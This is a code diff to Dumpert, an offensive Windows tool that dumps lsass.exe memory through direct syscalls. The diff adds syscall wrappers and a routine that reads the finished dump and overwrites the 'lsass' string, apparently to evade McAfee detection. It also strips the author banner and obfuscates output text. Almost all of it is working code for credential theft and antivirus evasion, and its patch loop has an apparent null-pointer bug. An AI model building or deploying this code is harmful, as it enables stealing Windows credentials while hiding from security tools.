@@ -180,17 +180,29 @@ BOOL SetDebugPrivilege() {
 	return TRUE;
 }
 
+char* find_str_in_data(const char* str, const char* data, int length){
+	int pos = 0;
+	int slen = strlen(str);
+	int datalen = strlen(data);
+	int diff = length - slen;
+
+	int i = 0;
+	while (pos < (length - slen)){
+		pos++;
+		i = 0;
+
+		while (i < slen && str[i] == data[pos + i]){
+			i++;
+		}
+		if (i == slen) {
+			return data + pos;
+		}
+	}
+	return NULL;
+}
+
 
 int wmain(int argc, wchar_t* argv[]) {
-	wprintf(L" ________          __    _____.__                 __				\n");
-	wprintf(L" \\_____  \\  __ ___/  |__/ ____\\  | _____    ____ |  | __		\n");
-	wprintf(L"  /   |   \\|  |  \\   __\\   __\\|  | \\__  \\  /    \\|  |/ /	\n");
-	wprintf(L" /    |    \\  |  /|  |  |  |  |  |__/ __ \\|   |  \\    <		\n");
-	wprintf(L" \\_______  /____/ |__|  |__|  |____(____  /___|  /__|_ \\		\n");
-	wprintf(L"         \\/                             \\/     \\/     \\/		\n");
-	wprintf(L"                                  Dumpert							\n");
-	wprintf(L"                               By Cneeliz @Outflank 2019		    \n\n");
-
 	LPCWSTR lpwProcName = L"lsass.exe";
 
 	if (sizeof(LPVOID) != 8) {
@@ -232,6 +244,9 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtCreateFile = &NtCreateFile10;
 		ZwClose = &ZwClose10;
 		pWinVerInfo->SystemCall = 0x3F;
+		//FBK
+		NtReadFile = &NtReadFile10;
+		NtWriteFile = &NtWriteFile10;
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
 		lpOSVersion = L"7 SP1 or Server 2008 R2";
@@ -241,6 +256,9 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtCreateFile = &NtCreateFile7SP1;
 		ZwClose = &ZwClose7SP1;
 		pWinVerInfo->SystemCall = 0x3C;
+		//FBK
+		NtReadFile = &NtReadFile7SP1;
+		NtWriteFile = &NtWriteFile7SP1;
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
 		lpOSVersion = L"8 or Server 2012";
@@ -250,6 +268,9 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtCreateFile = &NtCreateFile80;
 		ZwClose = &ZwClose80;
 		pWinVerInfo->SystemCall = 0x3D;
+		//FBK
+		NtReadFile = &NtReadFile80;
+		NtWriteFile = &NtWriteFile80;
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
 		lpOSVersion = L"8.1 or Server 2012 R2";
@@ -259,6 +280,9 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtCreateFile = &NtCreateFile81;
 		ZwClose = &ZwClose81;
 		pWinVerInfo->SystemCall = 0x3E;
+		//FBK
+		NtReadFile = &NtReadFile81;
+		NtWriteFile = &NtWriteFile81;
 	}
 	else {
 		wprintf(L"	[!] OS Version not supported.\n\n");
@@ -323,8 +347,9 @@ int wmain(int argc, wchar_t* argv[]) {
 	InitializeObjectAttributes(&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 	//  Open input file for writing, overwrite existing file.
-	status = NtCreateFile(&hDmpFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
+	status = NtCreateFile(&hDmpFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
 		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
 
 	if (hDmpFile == INVALID_HANDLE_VALUE) {
 		wprintf(L"	[!] Failed to create dumpfile.\n");
@@ -343,9 +368,48 @@ int wmain(int argc, wchar_t* argv[]) {
 	if ((!Success))
 	{
 		wprintf(L"	[!] Failed to create minidump, error code: %x\n", GetLastError());
+		ZwClose(hProcess);
+		exit(1);
 	}
 	else {
 		wprintf(L"	[+] Dump succesful.\n");
+	}
+
+	
+	const ULONG readSize = 2048;
+	Sleep(5000);
+	LARGE_INTEGER      byteOffset;
+	unsigned char szBuffer[2048];
+	char* s;
+	BOOL found = FALSE;
+	char McAfeeString[] = { 'l', 's', 'a', 's', 's' };
+	ZeroMemory(&szBuffer, readSize);
+	wprintf(L"[4] R3ad Dump FIle\n");
+	byteOffset.LowPart = byteOffset.HighPart = 0;
+	while (!found) {
+		status = NtReadFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
+		if (status == STATUS_SUCCESS) {
+			s = find_str_in_data(McAfeeString, szBuffer, readSize);
+			if ((s != NULL) || (byteOffset.LowPart >= 40000)) {
+				found = TRUE;
+				//DumpHex(szBuffer, readSize, byteOffset.LowPart); // used for debugging
+				szBuffer[s - szBuffer] = 'x';
+				szBuffer[s - szBuffer + 1] = 'x';
+				szBuffer[s - szBuffer + 2] = 'x';
+				szBuffer[s - szBuffer + 3] = 'x';
+				szBuffer[s - szBuffer + 4] = 'x';
+				wprintf(L"	[+] R3placing strIng at address %08X\n", s - szBuffer + byteOffset.LowPart);
+				//DumpHex(szBuffer, readSize, byteOffset.LowPart); // used for debugging
+				status = NtWriteFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
+			}
+			byteOffset.LowPart += readSize;
+		}
+		else {
+			wprintf(L"	[-] Failed to patch dump fIle. - %X\n", status);
+			wprintf(L"	[!] Err0r: %x\n", GetLastError());
+			ZwClose(hProcess);
+			exit(1);
+		}
 	}
 
 	ZwClose(hDmpFile);
